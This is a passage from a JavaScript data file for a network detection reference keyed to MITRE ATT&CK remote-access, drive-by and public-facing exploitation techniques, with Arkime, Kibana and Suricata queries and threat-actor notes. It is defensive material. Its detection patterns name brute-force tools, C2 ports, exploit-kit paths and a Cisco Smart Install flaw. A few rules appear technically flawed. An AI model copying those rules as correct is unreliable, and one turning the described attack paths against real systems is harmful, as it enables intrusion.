          { cls: "apt-kp", name: "Lazarus", note: "Uses off-hours remote access to avoid analyst attention during initial access and lateral movement phases." },
          { cls: "apt-mul", name: "Multi", note: "Off-hours remote access from new source IPs is documented as a high-confidence behavioral indicator in CISA and FBI joint advisories on credential-based intrusions." }
        ],
        cite: "MITRE ATT&CK T1133, T1078, CISA advisories"
      },
      {
        sub: "T1133 - RDP Exposure",
        indicator: "External RDP connection - internet-facing RDP from non-whitelisted IP",
        arkime: "ip.src != $MPNET\n&& ip.src != $ALLOWED_RDP_IPS\n&& port.dst == 3389\n&& protocols == rdp\n&& databytes.src > 0\n&& databytes.dst > 0",
        kibana: "NOT source.ip: $MPNET\nAND NOT source.ip: $ALLOWED_RDP_IPS\nAND destination.port: 3389\nAND network.transport: tcp\nAND source.bytes > 0\nAND destination.bytes > 0",
        suricata: "alert tcp $EXTERNAL_NET any\n  -> $HOME_NET 3389\n  (msg:\"TA0001 T1133 External RDP\n    connection non-whitelisted\n    source\";\n  flow:established,to_server;\n  content:\"|03 00|\"; depth:2;\n  content:\"|e0|\"; offset:5;\n  depth:1;\n  classtype:attempted-recon;\n  sid:9113303; rev:1;)",
        notes: "Internet-facing RDP (TCP/3389) is one of the most commonly exploited initial access vectors - it should never be directly exposed to the internet. If it is, any successful connection from a non-whitelisted IP is an immediate incident. Content '|03 00|' = TPKT header, '|e0|' at offset 5 = Connection Request TPDU - identifies an active RDP session initiation (not just a port scan). Distinguish between connection attempts (few packets, no authentication) and successful sessions (sustained bidirectional traffic, large databytes.dst).",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Uses exposed RDP as an initial access vector against government and military targets." },
          { cls: "apt-kp", name: "Lazarus", note: "Exploits internet-facing RDP in financial sector targeting." },
          { cls: "apt-mul", name: "Ransomware", note: "Exposed RDP is the primary initial access vector for the majority of ransomware operations - the single most common ransomware entry point per FBI and CISA advisories." }
        ],
        cite: "MITRE ATT&CK T1133, FBI ransomware advisories, CISA advisories"
      },
      {
        sub: "T1133 - RDP Exposure",
        indicator: "RDP credential spray - high-volume authentication attempts from single external source",
        arkime: "ip.src != $MPNET\n&& port.dst == 3389\n&& protocols == rdp\n&& packets.src > 5\n&& packets.dst > 5\n&& databytes.dst < 5000",
        kibana: "NOT source.ip: $MPNET\nAND destination.port: 3389\nAND network.transport: tcp\nAND network.packets > 5",
        suricata: "alert tcp $EXTERNAL_NET any\n  -> $HOME_NET 3389\n  (msg:\"TA0001 T1133 RDP credential\n    spray high volume auth\n    attempts\";\n  flow:established,to_server;\n  content:\"|03 00|\"; depth:2;\n  threshold:type both,\n    track by_src,\n    count 10, seconds 60;\n  classtype:attempted-user;\n  sid:9113304; rev:1;)",
        notes: "RDP credential spraying tools (Hydra, Medusa, NLBrute, RDPBrute) generate high-volume authentication attempts visible as rapid successive TCP/3389 connections. Each attempt: TCP connect, TPKT/RDP handshake, NLA authentication exchange, disconnect - generating a distinctive connection pattern of many short sessions from the same source. Low databytes.dst confirms no successful session data was transferred. Distributed sprays use many source IPs - look for the same username being attempted across many sources.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Conducts RDP credential spraying against financial sector targets as a precursor to initial access." },
          { cls: "apt-ru", name: "APT28", note: "Uses automated RDP credential spraying against government and military targets." }
        ],
        activity: [
          { cls: "apt-mul", name: "IAB", note: "Initial access brokers routinely spray RDP credentials at scale to build access inventories for ransomware operators." }
        ],
        cite: "MITRE ATT&CK T1133, T1110.003, FBI ransomware advisories"
      },
      {
        sub: "T1133 - SSH Brute Force",
        indicator: "SSH brute force - rapid successive authentication failures from external source",
        arkime: "ip.src != $MPNET\n&& port.dst == 22\n&& protocols == ssh\n&& packets.src > 3\n&& packets.dst > 3\n&& databytes.dst < 3000",
        kibana: "NOT source.ip: $MPNET\nAND destination.port: 22\nAND network.transport: tcp\nAND network.packets: [3 TO 20]\nAND destination.bytes: [0 TO 3000]",
        suricata: "alert tcp $EXTERNAL_NET any\n  -> $HOME_NET 22\n  (msg:\"TA0001 T1133 SSH brute\n    force rapid auth attempts\";\n  flow:established,to_server;\n  content:\"SSH-\"; depth:4;\n  threshold:type both,\n    track by_src,\n    count 5, seconds 30;\n  classtype:attempted-user;\n  sid:9113305; rev:1;)",
        notes: "SSH brute force tools (Hydra, Medusa, Patator) generate rapid successive SSH connections - each attempt completes the TCP handshake and SSH banner exchange before failing authentication and disconnecting. Low databytes.dst confirms no successful session. Content 'SSH-' matches the SSH protocol banner at the start of every SSH connection. Zeek ssh.log captures authentication success/failure explicitly - use Zeek for definitive auth failure correlation. Distinguish brute force (rapid, many failures, low databytes) from successful access (few connections, high databytes.dst, sustained session).",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Conducts SSH brute force against internet-facing Linux servers as an initial access vector in financial sector and cryptocurrency exchange targeting." },
          { cls: "apt-ir", name: "APT33", note: "Brute forces SSH on energy sector internet-facing Linux infrastructure." },
          { cls: "apt-mul", name: "Multi", note: "Automated scanning and brute force of SSH is constant background noise on any internet-exposed port 22 - documented in virtually every threat actor profile." }
        ],
        cite: "MITRE ATT&CK T1133, T1110.001, industry reporting"
      },
      {
        sub: "T1133 - SSH Anonymized Access",
        indicator: "[OFF-NET TRIPWIRE] SSH login from Tor exit node or known proxy / VPS range - anonymized initial access",
        arkime: "ip.src != $MPNET\n&& port.dst == 22\n&& protocols == ssh\n&& ip.src == $EXTERNAL_TOR_NODES\n|| ip.src == $EXTERNAL_VPS_RANGES\n&& databytes.src > 1000\n&& databytes.dst > 1000",
        kibana: "NOT source.ip: $MPNET\nAND destination.port: 22\nAND source.ip: $EXTERNAL_TOR_NODES\nAND source.bytes > 1000\nAND destination.bytes > 1000",
        suricata: "alert tcp $EXTERNAL_TOR_NODES any\n  -> $HOME_NET 22\n  (msg:\"TA0001 T1133 SSH login\n    from Tor exit node\n    anonymized access\";\n  flow:established,to_server;\n  content:\"SSH-\"; depth:4;\n  classtype:policy-violation;\n  sid:9113306; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Adversaries route SSH initial access through Tor exit nodes or anonymizing VPS infrastructure (DigitalOcean, Vultr, Linode, AWS) to obscure their origin. Maintain a current Tor exit node list (updated daily from dan.me.uk/torlist or similar) in Suricata's $EXTERNAL_TOR_NODES variable. Successful SSH sessions from Tor exit nodes (bidirectional traffic, high databytes) are near-certain malicious - no legitimate administrative use case requires Tor for SSH. VPS range detection requires a threat intel feed of commonly abused hosting provider CIDR ranges.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Uses Tor and anonymizing VPS infrastructure to route SSH access to compromised cryptocurrency and financial sector servers." },
          { cls: "apt-ir", name: "APT33", note: "Routes access to compromised energy sector infrastructure through anonymizing proxies and VPS services." },
          { cls: "apt-mul", name: "Multi", note: "SSH access via Tor is documented in multiple nation-state and criminal intrusion campaigns as a standard operational security measure." }
        ],
        cite: "MITRE ATT&CK T1133, T1090.003, industry reporting"
      },
      {
        sub: "T1133 - Citrix / VDI",
        indicator: "Citrix / RD Gateway authentication from unexpected source - cloud-hosted access broker abuse",
        arkime: "ip.src != $MPNET\n&& ip.src != $ALLOWED_CITRIX_IPS\n&& protocols == https\n&& host.http == [\"*citrix*\", \"*netscaler*\", \"*storefront*\", \"*rdweb*\", \"*rdgateway*\", \"*horizon*\", \"*workspaceone*\"]\n&& http.method == POST\n&& http.uri == [\"*/cgi/login*\", \"*/vpn/index*\", \"*/logon/LogonPoint*\", \"*/RDWeb/Pages/en-US/login*\", \"*/portal/webclient*\"]\n&& databytes.src > 500",
        kibana: "NOT source.ip: $MPNET\nAND NOT source.ip: $ALLOWED_CITRIX_IPS\nAND http.request.method: POST\nAND url.domain: (\n  *citrix* OR *netscaler*\n  OR *storefront* OR *rdweb*\n  OR *horizon* OR *workspaceone*\n)\nAND url.path: (\n  *cgi/login* OR *vpn/index*\n  OR *LogonPoint*\n  OR *RDWeb* OR *webclient*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1133 Citrix RD\n    Gateway auth from unexpected\n    source\";\n  flow:established,to_server;\n  content:\"POST\"; http.method;\n  pcre:\"/(cgi\\/login|\n    vpn\\/index|LogonPoint|\n    RDWeb\\/Pages|\n    portal\\/webclient)/i\";\n  http.uri;\n  classtype:policy-violation;\n  sid:9113307; rev:1;)",
        notes: "Citrix NetScaler/ADC, Citrix StoreFront, VMware Horizon, and RD Web Access are high-value targets - successful authentication gives adversaries GUI access to internal applications and desktops without requiring VPN. POST to login paths from unexpected source IPs indicates credential use from adversary-controlled infrastructure. Citrix CVE-2019-19781 (Shitrix) - path traversal enabling unauthenticated RCE - should also be monitored via T1190 VPN path indicators. Correlate authentication success with subsequent session activity: legitimate users open specific applications; adversaries often open full desktop sessions and initiate immediate reconnaissance.",
        apt: [
          { cls: "apt-cn", name: "APT41", note: "Abuses Citrix and VDI infrastructure for initial access against healthcare, technology, and gaming sector targets using stolen credentials." },
          { cls: "apt-ir", name: "APT33", note: "Uses compromised Citrix credentials to access energy sector internal applications." },
          { cls: "apt-mul", name: "Ransomware", note: "Citrix and RD Gateway authentication abuse is documented in multiple CISA advisories and ransomware incident reports as a common initial access vector." }
        ],
        cite: "MITRE ATT&CK T1133, T1078, CISA advisories"
      },
      {
        sub: "T1133 - Cloud Management",
        indicator: "[OFF-NET TRIPWIRE] Cloud management API authentication from unexpected IP / new ASN - console credential abuse",
        arkime: "ip.src != $MPNET\n&& ip.src != $ALLOWED_ADMIN_IPS\n&& protocols == https\n&& host.http == [\"*console.aws.amazon.com*\", \"*portal.azure.com*\", \"*console.cloud.google.com*\", \"*management.azure.com*\", \"*ec2.amazonaws.com*\"]\n&& http.method == POST\n&& http.uri == [\"*/oauth/token*\", \"*/signin/oauth*\", \"*/login*\"]",
        kibana: "NOT source.ip: $MPNET\nAND NOT source.ip: $ALLOWED_ADMIN_IPS\nAND http.request.method: POST\nAND url.domain: (\n  *console.aws.amazon.com*\n  OR *portal.azure.com*\n  OR *console.cloud.google.com*\n  OR *management.azure.com*\n)\nAND url.path: (\n  *oauth/token* OR *signin*\n  OR *login*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $EXTERNAL_NET 443\n  (msg:\"TA0001 T1133 Cloud console\n    auth from unexpected IP\n    credential abuse\";\n  flow:established,to_server;\n  content:\"POST\"; http.method;\n  pcre:\"/(console\\.(aws\\.amazon|\n    cloud\\.google)\\.com|\n    portal\\.azure\\.com|\n    management\\.azure\\.com)/i\";\n  http.header;\n  classtype:policy-violation;\n  sid:9113308; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Cloud console and API authentication from unexpected IPs or new ASNs indicates stolen credential use. Cloud management plane access is particularly high-impact - a successful console login gives adversaries access to all cloud resources including compute, storage, secrets, and IAM. Requires SSL/TLS inspection or egress proxy to detect outbound connections to cloud management URLs. Correlate with your cloud provider's CloudTrail (AWS), Azure Activity Log, or GCP Audit Log - network-layer detection is a supplementary signal. Watch for: new AWS access key usage, Azure portal login from new country, GCP service account key download from unknown IP.",
        apt: [
          { cls: "apt-ru", name: "APT29", note: "Uses stolen credentials to access cloud management consoles (Azure, AWS) as an initial access vector, documented in CISA and NSA advisories on APT29 cloud-targeting operations." },
          { cls: "apt-cn", name: "APT41", note: "Abuses cloud management APIs with stolen credentials in targeted intrusion operations against technology and healthcare sector organizations." },
          { cls: "apt-mul", name: "Scattered Spider", note: "Compromises cloud console credentials via social engineering and SIM swapping, then accesses AWS and Azure management planes to deploy ransomware at cloud scale." }
        ],
        cite: "MITRE ATT&CK T1133, T1078.004, CISA advisories"
      }
    ]
  },
  {
    id: "T1189",
    name: "Drive-by Compromise",
    desc: "Watering hole · exploit kits · browser exploitation via legitimate sites",
    rows: [
      {
        sub: "T1189 - Watering Hole Redirect Chains",
        indicator: "[OFF-NET TRIPWIRE] Multi-hop HTTP redirect chain - exploit kit gate / traffic distribution system",
        kibana: "source.ip: $MPNET\nAND http.response.status_code: (\n  301 OR 302 OR 303\n  OR 307 OR 308\n)\nAND http.response.headers.location:\n  http*\nAND NOT destination.ip:\n  $ALLOWED_DEFAULTS",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1189 Multi-hop\n    redirect chain possible\n    exploit kit gate\";\n  flow:established,to_server;\n  content:\"GET\"; http.method;\n  threshold:type both,\n    track by_src,\n    count 3, seconds 10;\n  classtype:trojan-activity;\n  sid:9118901; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Exploit kit traffic distribution systems (TDS) gate victims through 2-5 HTTP redirects before delivering the exploit landing page - each hop profiles the victim (OS, browser, plugins) and passes only qualifying targets forward. The redirect chain has a distinctive pattern: very small response bodies (just the redirect header, no content), rapid sequential requests from the same source IP to different hosts, and a mix of HTTP 301/302 codes. Low databytes.src (<500) confirms no meaningful content was served - just redirection. Correlate the final destination of the chain with threat intel.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Used multi-hop redirect chains to gate watering hole victims through profiling infrastructure before delivering browser exploits, documented in operations against NATO member government websites." },
          { cls: "apt-cn", name: "APT40", note: "Used traffic distribution systems to gate maritime sector and government target victims through redirect chains before exploit delivery." },
          { cls: "apt-kp", name: "Lazarus", note: "Used redirect chain gating in Operation Dream Job and similar campaigns." }
        ],
        cite: "MITRE ATT&CK T1189, industry reporting"
      },
      {
        sub: "T1189 - Watering Hole Redirect Chains",
        indicator: "[OFF-NET TRIPWIRE] Newly registered domain in HTTP redirect destination - drive-by staging infrastructure",
        kibana: "source.ip: $MPNET\nAND http.response.status_code:\n  (301 OR 302)\nAND http.response.headers.location:\n  http*\nAND NOT destination.ip: $ALLOWED_DEFAULTS",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1189 Redirect to\n    newly registered domain\n    drive-by staging\";\n  flow:established,to_server;\n  content:\"Location:\"; http.header;\n  pcre:\"/Location:\\s*https?:\\/\\/\n    [a-z0-9\\-]{6,}\\.\n    (xyz|top|club|online|site|\n    live|fun|pw|cc|tk)/i\";\n  http.header;\n  classtype:trojan-activity;\n  sid:9118902; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Drive-by staging infrastructure uses newly registered domains with cheap TLDs (.xyz, .top, .club, .online, .site, .pw) as exploit landing pages - these domains are registered days before the campaign and burned after. The Suricata PCRE matches these TLDs specifically. Enrich with passive DNS age data - any redirect destination registered less than 14 days ago is high-priority. Integrate with threat intel feeds that track newly registered domains for malicious patterns. This is one of the most reliable low-FP indicators of drive-by staging infrastructure.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Uses newly registered domains with cheap TLDs as exploit staging infrastructure, rotating infrastructure rapidly to avoid blocklist detection." },
          { cls: "apt-cn", name: "APT41", note: "Registers domains days before campaigns and uses them as exploit landing pages before burning them." },
          { cls: "apt-mul", name: "Multi", note: "Newly registered domain detection is a high-confidence indicator for drive-by staging across both nation-state and criminal exploit kit operations." }
        ],
        cite: "MITRE ATT&CK T1189, T1583.001, industry reporting"
      },
      {
        sub: "T1189 - Exploit Kit Profiling",
        indicator: "[OFF-NET TRIPWIRE] Browser plugin / capability enumeration request - exploit kit victim profiling",
        arkime: "ip.src == $MPNET\n&& protocols == http\n&& http.method == GET\n&& http.uri == [\"*detect.js*\", \"*check.js*\", \"*scan.php*\", \"*gate.php*\", \"*land.php*\", \"*count.php*\", \"*click.php*\", \"*go.php*\"]\n&& http.user-agent == [\"*Mozilla*\", \"*Chrome*\"]\n&& databytes.dst > 500\n&& ip.dst != $ALLOWED_DEFAULTS",
        kibana: "source.ip: $MPNET\nAND http.request.method: GET\nAND url.path: (\n  *detect.js* OR *check.js*\n  OR *scan.php* OR *gate.php*\n  OR *land.php* OR *count.php*\n  OR *click.php* OR *go.php*\n)\nAND NOT destination.ip: $ALLOWED_DEFAULTS",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1189 Exploit kit\n    victim profiling URI pattern\";\n  flow:established,to_server;\n  content:\"GET\"; http.method;\n  pcre:\"/(detect|check|scan|gate|\n    land|count|click|go)\n    \\.(php|js)\\b/i\";\n  http.uri;\n  classtype:trojan-activity;\n  sid:9118903; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Exploit kits serve a profiling script before delivering the exploit - this script fingerprints the victim's browser, plugins (Java, Flash, PDF reader), OS version, and screen resolution to select the appropriate exploit. Common filenames are detect.js, check.php, gate.php, and similar generic names. The response contains JavaScript that enumerates capabilities and returns them to the kit. Combine with the source domain reputation and whether it appears in redirect chain context - profiling scripts on their own are low-confidence, but in combination with a redirect chain entry and a subsequent PE/exploit delivery they form a strong kill chain narrative.",
        apt: [
          { cls: "apt-ru", name: "APT28", note: "Used victim profiling scripts in watering hole operations against government and defense sector targets to fingerprint visiting browsers and deliver targeted exploits based on plugin version." },
          { cls: "apt-mul", name: "Multi", note: "Criminal exploit kit operations (Angler, RIG, Magnitude) universally use victim profiling as the first step in the delivery chain." }
        ],
        cite: "MITRE ATT&CK T1189, industry reporting"
      },
      {
        sub: "T1189 - Exploit Kit Delivery",
        indicator: "Drive-by payload delivery - executable or shellcode served via HTTP from non-standard path",
        arkime: "ip.src == $MPNET\n&& protocols == http\n&& http.statuscode == 200\n&& http.uri != [\"*/download*\", \"*/files/*\", \"*/update*\", \"*/setup*\"]\n&& ip.dst != $ALLOWED_DEFAULTS\n&& databytes.dst > 10000\n// Content-Type response-header inspection (application/octet-stream, x-msdownload, x-dosexec)\n// is not available in baseline Arkime 4.3.1 - http.response-header field does not exist. The\n// query catches the volume + path heuristic; for MIME-based detection see Suricata file_data\n// content rules or Zeek http.log mime-types.",
        kibana: "source.ip: $MPNET\nAND http.response.status_code: 200\nAND http.response.headers.content-type: (\n  *octet-stream*\n  OR *x-msdownload*\n  OR *x-dosexec*\n)\nAND NOT url.path: (\n  *download* OR *files*\n  OR *update* OR *setup*\n)\nAND NOT destination.ip: $ALLOWED_DEFAULTS",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1189 Drive-by\n    executable payload delivery\n    non-standard path\";\n  flow:established,from_server;\n  content:\"200\"; http.stat_code;\n  pcre:\"/(application\\/\n    (octet-stream|x-msdownload|\n    x-dosexec))/i\";\n  http.header;\n  file_data;\n  content:\"|4d 5a|\"; depth:2;\n  classtype:trojan-activity;\n  sid:9118904; rev:1;)",
        notes: "The final stage of a drive-by delivers the payload - typically a PE (MZ header '|4d 5a|'), shellcode, or a malicious document served as application/octet-stream from a non-standard URL path. Legitimate software downloads use consistent paths (/download/, /files/, /update/); exploit kit payloads use random or generic paths (/a.php, /p.bin, /x.exe). Content '|4d 5a|' at depth 2 matches the MZ PE header in the response body. This rule fires on the actual payload delivery - by the time this fires the victim's browser has already been exploited.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Delivered drive-by payloads via compromised legitimate websites in Operation AppleJeus and similar campaigns, serving PE payloads via HTTP from compromised web infrastructure." },
          { cls: "apt-cn", name: "APT41", note: "Used drive-by payload delivery via exploit kit infrastructure against gaming and technology sector targets." },
          { cls: "apt-ru", name: "APT28", note: "Served malicious payloads via watering hole sites targeting NATO and government sector visitors." }
        ],
        cite: "MITRE ATT&CK T1189, industry reporting"
      },
      {
        sub: "T1189 - Watering Hole Identification",
        indicator: "[OFF-NET TRIPWIRE] Internal user requesting known compromised / categorized malicious domain",
        arkime: "ip.src == $MPNET\n&& protocols == http\n&& host.http == $EXTERNAL_TI_DOMAINS\n&& http.method == GET\n&& databytes.src > 0",
        kibana: "source.ip: $MPNET\nAND http.request.method: GET\nAND destination.ip: $THREAT_INTEL_IPS\nAND source.bytes > 0",
        suricata: "alert http $HOME_NET any\n  -> $EXTERNAL_NET any\n  (msg:\"TA0001 T1189 Internal host\n    connecting to known watering\n    hole / malicious domain\";\n  flow:established,to_server;\n  dns.query;\n  content:\"|00 01 00 00 00 00 00 00|\";\n  classtype:trojan-activity;\n  sid:9118905; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects connections to off-MPNet infrastructure that should be unreachable from an air-gapped environment. Any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Threat intel feeds maintain lists of known watering hole domains and IPs - integrate these with Suricata's rule sets and Kibana's threat intel enrichment. For Arkime, maintain a $EXTERNAL_TI_DOMAINS field reference updated from your threat intel platform. A victim connecting to a known watering hole domain from inside your network = active drive-by in progress or already completed. Correlate with what was downloaded (databytes.dst) and any subsequent outbound connections from the same host - post-exploitation C2 often follows within seconds to minutes.",
        apt: [
          { cls: "apt-cn", name: "APT10", note: "Targeted industry vertical websites frequented by MSP and technology sector employees in watering hole operations." },
          { cls: "apt-ru", name: "APT28", note: "Targeted NATO and government sector news and policy sites in watering hole operations." },
          { cls: "apt-ir", name: "APT33", note: "Targeted energy sector industry sites in watering hole operations." },
          { cls: "apt-kp", name: "Lazarus", note: "Targeted financial sector and cryptocurrency exchange sites in watering hole operations." }
        ],
        cite: "MITRE ATT&CK T1189, T1584.004, industry reporting"
      },
      {
        sub: "T1189 - Post-Exploit C2",
        indicator: "[OFF-NET TRIPWIRE] Unexpected outbound connection immediately following web browsing session - post-exploit C2 beacon",
        arkime: "ip.src == $MPNET\n&& protocols != [http, https, dns]\n&& port.dst == [443, 80, 8080, 8443, 4444, 1337, 6666]\n&& ip.dst != $ALLOWED_DEFAULTS",
        kibana: "source.ip: $MPNET\nAND NOT network.protocol: (\n  http OR dns OR tls\n)\nAND destination.port: (\n  443 OR 80 OR 8080\n  OR 4444 OR 1337\n)\nAND NOT destination.ip: $ALLOWED_DEFAULTS",
        suricata: "alert tcp $HOME_NET any\n  -> $EXTERNAL_NET\n  [80,443,8080,8443,4444,1337,6666]\n  (msg:\"TA0001 T1189 Non-browser\n    outbound on web port post\n    browse possible C2\";\n  flow:established,to_server;\n  content:!\"|16 03|\"; depth:2;\n  content:!\"GET \"; depth:5;\n  content:!\"POST \"; depth:6;\n  threshold:type both,\n    track by_src,\n    count 1, seconds 30;\n  classtype:trojan-activity;\n  sid:9118906; rev:1;)",
        notes: "[AIR-GAP TRIPWIRE] This indicator detects outbound traffic from MPNET to off-MPNET infrastructure. In a properly air-gapped environment this query should never produce hits; any hit indicates a likely air-gap violation: bridged USB tether, rogue cellular modem, vendor/maintenance laptop bridging networks, supply-chain implant calling home, or misconfigured perimeter device. Treat as priority-1 escalation; do not dismiss as false positive without thorough investigation. Post drive-by exploitation, the delivered payload almost immediately initiates a C2 beacon. This is typically a non-HTTP/HTTPS connection on a web port (to blend in) or a raw TCP connection to the C2 server. The timing correlation is key - a non-browser process connecting outbound within 30 seconds of a browser session to an unknown host is highly suspicious. In Arkime, correlate by source IP across time windows. Suricata content negation (!|16 03| = not TLS, !'GET ' = not HTTP) catches raw TCP C2 on web ports. EDR correlation is ideal here - process-level data identifies which process made the connection.",
        apt: [
          { cls: "apt-kp", name: "Lazarus", note: "Payloads beacon within 5-30 seconds of execution following drive-by compromise." },
          { cls: "apt-cn", name: "APT41", note: "C2 traffic follows exploit delivery with characteristic timing patterns." },
          { cls: "apt-ru", name: "APT28", note: "Post-exploit implants initiate C2 immediately after successful exploitation." }
        ],
        cite: "MITRE ATT&CK T1189, T1071, industry reporting"
      },
      {
        sub: "T1189 - Document Delivery",
        indicator: "Malformed or exploit-bearing PDF / Office document served via HTTP from unknown host",
        arkime: "ip.src == $MPNET\n&& protocols == http\n&& http.statuscode == 200\n&& http.uri != [\"*/download*\", \"*/docs/*\", \"*/files/*\", \"*/attachments/*\"]\n&& http.uri == [\"*.pdf\", \"*.doc\", \"*.docx\", \"*.xls\", \"*.xlsx\", \"*.ppt\", \"*.pptx\"]\n&& ip.dst != $ALLOWED_DEFAULTS\n// Content-Type response-header inspection is not available in baseline Arkime 4.3.1. The query\n// uses URI-extension matching as a baseline-compatible alternative. For true MIME detection see Suricata\n// file_data rules or Zeek file analysis framework.",
        kibana: "source.ip: $MPNET\nAND http.response.status_code: 200\nAND http.response.headers.content-type: (\n  *application/pdf*\n  OR *application/msword*\n  OR *vnd.ms-*\n  OR *vnd.openxml*\n)\nAND NOT destination.ip: $ALLOWED_DEFAULTS\nAND NOT url.path: (\n  *download* OR *docs*\n  OR *files* OR *attachments*\n)",
        suricata: "alert http $EXTERNAL_NET any\n  -> $HOME_NET any\n  (msg:\"TA0001 T1189 Exploit doc\n    served from unknown host\n    possible drive-by\";\n  flow:established,from_server;\n  content:\"200\"; http.stat_code;\n  pcre:\"/(application\\/\n    (pdf|msword|vnd\\.ms\\-|\n    vnd\\.openxml))/i\";\n  http.header;\n  file_data;\n  content:\"|25 50 44 46|\"; depth:4;\n  classtype:trojan-activity;\n  sid:9118907; rev:1;)",
        notes: "Drive-by attacks deliver exploit-bearing documents via HTTP - malicious PDFs (|25 50 44 46| = %PDF header), Word documents, and Excel files served from unknown hosts as part of the exploit chain. Legitimate document downloads come from known domains (SharePoint, Google Drive, your CDN) - documents served from unknown hosts in the context of a redirect chain are high-priority. Content '|25 50 44 46|' at depth 4 matches the PDF magic bytes. For Office documents check for |D0 CF 11 E0| (OLE2/legacy) or the ZIP header |50 4B 03 04| (OOXML). Zeek's files.log captures file metadata including MIME type and MD5.",
        apt: [
          { cls: "apt-cn", name: "APT40", note: "Delivered exploit-bearing PDF and Office documents via watering hole sites targeting maritime and government sector victims." },
          { cls: "apt-ir", name: "Charming Kitten", note: "Served malicious PDF documents via drive-by infrastructure targeting academic and NGO sector victims." },
          { cls: "apt-kp", name: "Kimsuky", note: "Delivered exploit documents via watering hole sites targeting South Korean government and policy organization visitors." }
        ],
        cite: "MITRE ATT&CK T1189, T1566.001, industry reporting"
      }
    ]
  },
  {
    id: "T1190",
    name: "Exploit Public-Facing Application",
    desc: "Web app · VPN · Mail server · Network appliance vulnerability exploitation",
    rows: [
      {
        sub: "T1190 - Cisco Smart Install (CVE-2018-0171)",
        indicator: "[OFF-NET TRIPWIRE] Inbound TCP/4786 to Cisco switches - Smart Install abuse to read/overwrite device config (Salt Typhoon initial access)",
        arkime: "port.dst == 4786\n&& ip.dst == $NETWORK_DEVICES\n&& tcp.flags.syn == 1",
        kibana: "destination.port: 4786\nAND destination.ip: $NETWORK_DEVICES\nAND network.transport: tcp",
        suricata: "alert tcp any any\n  -> $NETWORK_DEVICES 4786\n  (msg:\"TA0001 T1190 Cisco Smart\n    Install access CVE-2018-0171\n    - unauthenticated config\n    read/write (Salt Typhoon)\";\n  flow:to_server,established;\n  flowbits:set,smi.attempt;\n  threshold:type both,\n    track by_dst,\n    count 1, seconds 3600;\n  classtype:attempted-admin;\n  sid:9119001; rev:1;)",
        notes: "Cisco Smart Install (SMI) is a legacy zero-touch provisioning feature that listens on TCP/4786 with no authentication. CVE-2018-0171 lets an unauthenticated remote attacker read or overwrite the device configuration and execute arbitrary commands - and Salt Typhoon exploited exactly this in Cisco IOS / IOS XE for initial access into telecom networks. SMI should be disabled on production switches (no vstack), so ANY traffic to 4786 - from the internet, or east-west from an unexpected internal host - is suspect. Hunt method: alert on any inbound TCP/4786 to your switch management addresses; legitimate SMI use is rare and should come only from a known director. Pair with follow-on signals that indicate the access was used: a config pull over TFTP/UDP-69 (see T1602.002), new SSH authorized_keys or local accounts appearing on the device, ACL/loopback changes, or a new GRE tunnel in the running-config. The Shadowserver Foundation scans for exposed SMI globally - if your perimeter shows 4786 open, assume it has been probed. Remediation: disable Smart Install, patch IOS/IOS XE, and restrict management-plane access with control-plane ACLs.",
        apt: [
          { cls: "apt-cn", name: "Salt Typhoon", note: "Exploited CVE-2018-0171 in the Cisco IOS / IOS XE Smart Install feature for initial access into telecommunications providers, then pivoted via device configs and GRE tunnels." },
          { cls: "apt-cn", name: "Volt Typhoon", note: "Targets Cisco and other edge devices for initial access into critical infrastructure; SMI and other appliance CVEs fit their edge-first tradecraft." },
          { cls: "apt-mul", name: "Multi", note: "Exposed Smart Install on 4786 has been mass-scanned and abused for years; commodity and state actors alike use it where it remains enabled." }
        ],
